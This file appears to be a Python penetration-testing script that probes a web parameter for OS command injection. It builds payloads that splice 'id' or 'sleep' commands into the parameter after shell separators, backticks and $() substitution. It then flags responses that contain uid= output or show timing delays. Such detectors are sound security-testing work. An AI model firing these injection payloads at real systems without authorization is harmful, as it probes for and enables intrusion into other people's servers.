#!/usr/bin/env python3
"""Detect OS command injection with output-based and time-based payloads."""

import argparse
import re
import time
import urllib.parse

from sqli_detection_probe import build_url, fetch

OUTPUT_SIGNATURE = re.compile(r"uid=\d+\([\w-]+\)")


def output_payloads(baseline):
  separators = [";", "|", "&", "\n", "&&", "||"]
  return [f"{baseline}{sep}id" for sep in separators] + [f"{baseline}`id`", f"{baseline}$(id)"]


def time_payloads(baseline, seconds):
  separators = [";", "|", "&&", "\n"]
  return [f"{baseline}{sep}sleep {seconds}" for sep in separators] + [
    f"{baseline}$(sleep {seconds})",
    f"{baseline}`sleep {seconds}`",
  ]


def main():
  parser = argparse.ArgumentParser(description="Probe a parameter for OS command injection on an authorized target.")
  parser.add_argument("url", help="endpoint with injectable parameter")
  parser.add_argument("--param", default=None, help="parameter to test; default: first in URL")
  parser.add_argument("--time-seconds", type=int, default=6, help="sleep duration for blind timing tests")
  parser.add_argument("--skip-time", action="store_true", help="only run fast output-based tests")
  parser.add_argument("--delay", type=float, default=0.2)
  args = parser.parse_args()

  if not args.param:
    query = urllib.parse.urlsplit(args.url).query
    args.param = query.split("=")[0].split("&")[0] if "=" in query else "q"

  baseline_status, baseline_body = fetch(build_url(args.url, args.param, "cmdbaseline"), timeout=15)
  print(f"[*] baseline: HTTP {baseline_status}, {len(baseline_body)} bytes\n")

  confirmed = False

  print("[*] output-based tests:")
  for payload in output_payloads("cmdbaseline"):
    status, body = fetch(build_url(args.url, args.param, payload), timeout=15)
    match = OUTPUT_SIGNATURE.search(body)
    flagged = bool(match) and not OUTPUT_SIGNATURE.search(baseline_body)
    flag = "[!]" if flagged else "[ ]"
    print(f"{flag} {payload!r:<30} HTTP {status}")
    if flagged:
      print(f"      evidence: {body[match.start():match.end() + 40]}")
      confirmed = True
    time.sleep(args.delay)

  if not args.skip_time:
    threshold = args.time_seconds * 0.8
    print(f"\n[*] time-based tests (sleep {args.time_seconds}s; flagging >{threshold:.1f}s):")
    for payload in time_payloads("cmdbaseline", args.time_seconds):
      start = time.monotonic()
      status, _ = fetch(build_url(args.url, args.param, payload), timeout=45)
      elapsed = time.monotonic() - start
      flagged = threshold <= elapsed < 40
      flag = "[!]" if flagged else "[ ]"
      print(f"{flag} {payload!r:<35} {elapsed:5.2f}s")
      if flagged:
        confirmed = True
      time.sleep(args.time_seconds * 0.5)

  print()
  if confirmed:
    print("[!] Command injection indicators found - confirm manually and document impact.")
  else:
    print("[+] No command injection indicators from these payloads.")


if __name__ == "__main__":
  main()
